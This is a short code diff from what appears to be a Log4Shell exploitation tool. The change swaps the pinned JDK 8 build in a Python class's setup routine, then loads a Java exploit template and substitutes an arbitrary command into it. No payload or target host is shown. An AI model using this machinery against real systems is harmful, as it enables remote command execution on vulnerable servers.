@@ -359,12 +359,12 @@ class Trainman:
             return output
         env = {}
         env.update(os.environ)
-        jvm_install_cmd = '/root/.jabba/bin/jabba install adopt@1.8.0-292'
+        jvm_install_cmd = '/root/.jabba/bin/jabba install openjdk-ri@1.8.41'
         subprocess.Popen(
             jvm_install_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, env=env
         )
-        os.environ['JAVA_HOME'] = '/root/.jabba/jdk/adopt@1.8.0-292'
-        os.environ['PATH'] = os.environ['PATH'] + ':/root/.jabba/jdk/adopt@1.8.0-292/bin'
+        os.environ['JAVA_HOME'] = '/root/.jabba/jdk/openjdk-ri@1.8.41'
+        os.environ['PATH'] = os.environ['PATH'] + ':/root/.jabba/jdk/openjdk-ri@1.8.41/bin'
         env.update(os.environ)
         with open('/L4sh/db/template.java', 'r') as exploit_template:
             exploit_code = exploit_template.read().replace('CMDGOESHERE', exec_cmd)
